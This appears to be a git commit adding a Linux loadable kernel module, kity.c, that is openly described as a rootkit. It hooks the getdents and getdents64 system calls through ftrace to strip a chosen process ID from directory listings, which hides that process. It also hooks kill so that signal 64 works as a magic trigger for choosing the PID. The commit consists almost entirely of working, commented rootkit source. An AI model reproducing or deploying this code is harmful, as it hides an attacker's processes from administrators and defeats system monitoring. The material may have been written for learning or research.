8bdf1c4822cf0c46c14479449c0386bf76c50c02
maksprotsyk <maksprotsyk@ucu.edu.ua>
2021-11-12 19:08:28 +0200

    Added processing hiding

---
+++ process_hiding/kity.c
@@ -0,0 +1,247 @@
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/dirent.h>
+#include <linux/version.h>
+
+#include "ftrace_helper.h"
+
+MODULE_LICENSE("GPL");
+
+/* After Kernel 4.17.0, the way that syscalls are handled changed
+ * to use the pt_regs struct instead of the more familar function
+ * prototype declaration. We have to check for this, and set a
+ * variable for later on */
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+/* Global variable to store the pid that we are going to hide */
+char hide_pid[NAME_MAX];
+
+/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
+ * declare the orig_getdents64 and hook_getdents64 functions differently
+ * depending on the kernel version. This is the larget barrier to
+ * getting the rootkit to work on earlier kernel versions. The
+ * more modern way is to use the pt_regs struct. */
+
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+static asmlinkage long (*orig_getdents)(const struct pt_regs *);
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+/* This is our hooked function for sys_getdents64 */
+asmlinkage int hook_getdents64(const struct pt_regs *regs)
+{
+    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
+    // int fd = regs->di;
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+    // int count = regs->dx;
+
+    long error;
+
+    /* We will need these intermediate structures for looping through the directory listing */
+    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    unsigned long offset = 0;
+
+    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
+     * examine it's contents to remove anything that is prefixed by hide_pid.
+     * We also allocate dir_entry with the same amount of memory as  */
+    int ret = orig_getdents64(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+    if ( (ret <= 0) || (dirent_ker == NULL) )
+        return ret;
+
+    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
+     * dirent_ker is our copy of the returned dirent struct that we can play with */
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if (error)
+        goto done;
+
+    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
+    while (offset < ret)
+    {
+        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
+        current_dir = (void *)dirent_ker + offset;
+
+        /* Compare current_dir->d_name to hide_pid - we also have to check that hide_pid isn't empty! */
+        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
+        {
+            /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the 
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        else
+        {
+            /* If we end up here, then we didn't find hide_pid in current_dir->d_name 
+             * We set previous_dir to the current_dir before moving on and incrementing
+             * current_dir at the start of the loop */
+            previous_dir = current_dir;
+        }
+
+        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
+         * directory listing */
+        offset += current_dir->d_reclen;
+    }
+
+    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
+     * Note that dirent is already in the right place in memory to be referenced by the integer
+     * ret. */
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error)
+        goto done;
+
+done:
+    /* Clean up and return whatever is left of the directory listing to the user */
+    kfree(dirent_ker);
+    return ret;
+
+}
+
+/* This is our hook for sys_getdetdents */
+asmlinkage int hook_getdents(const struct pt_regs *regs)
+{
+    /* The linux_dirent struct got removed from the kernel headers so we have to
+     * declare it ourselves */
+    struct linux_dirent {
+        unsigned long d_ino;
+        unsigned long d_off;
+        unsigned short d_reclen;
+        char d_name[];
+    };
+
+    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
+    // int fd = regs->di;
+    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
+    // int count = regs->dx;
+
+    long error;
+
+    /* We will need these intermediate structures for looping through the directory listing */
+    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
+    unsigned long offset = 0;
+
+    /* We first have to actually call the real sys_getdents syscall and save it so that we can
+     * examine it's contents to remove anything that is prefixed by hide_pid.
+     * We also allocate dir_entry with the same amount of memory as  */
+    int ret = orig_getdents(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+    if ( (ret <= 0) || (dirent_ker == NULL) )
+        return ret;
+
+    /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
+     * dirent_ker is our copy of the returned dirent struct that we can play with */
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if (error)
+        goto done;
+
+    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
+    while (offset < ret)
+    {
+        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
+        current_dir = (void *)dirent_ker + offset;
+
+        /* Compare current_dir->d_name to hide_pid - we also have to make sure that hide_pid isn't empty! */
+        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
+        {
+            /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the 
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        else
+        {
+            /* If we end up here, then we didn't find hide_pid in current_dir->d_name 
+             * We set previous_dir to the current_dir before moving on and incrementing
+             * current_dir at the start of the loop */
+            previous_dir = current_dir;
+        }
+
+        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
+         * directory listing */
+        offset += current_dir->d_reclen;
+    }
+
+    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
+     * Note that dirent is already in the right place in memory to be referenced by the integer
+     * ret. */
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error)
+        goto done;
+
+done:
+    /* Clean up and return whatever is left of the directory listing to the user */
+    kfree(dirent_ker);
+    return ret;
+
+}
+
+/* This is our hooked function for sys_kill */
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    pid_t pid = regs->di;
+    int sig = regs->si;
+
+    if ( sig == 64 )
+    {
+        /* If we receive the magic signal, then we just sprintf the pid
+         * from the intercepted arguments into the hide_pid string */
+        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+        sprintf(hide_pid, "%d", pid);
+        return 0;
+    }
+
+    return orig_kill(regs);
+}
+
+
+/* Declare the struct that ftrace needs to hook the syscall */
+static struct ftrace_hook hooks[] = {
+    HOOK("sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
+
+};
+
+/* Module initialization function */
+static int __init rootkit_init(void)
+{
+    /* Hook the syscall and print to the kernel buffer */
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+
+    printk(KERN_INFO "rootkit: Loaded >:-)\n");
+
+    return 0;
+}
+
+static void __exit rootkit_exit(void)
+{
+    /* Unhook and restore the syscall and print to the kernel buffer */
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "rootkit: Unloaded :-(\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+
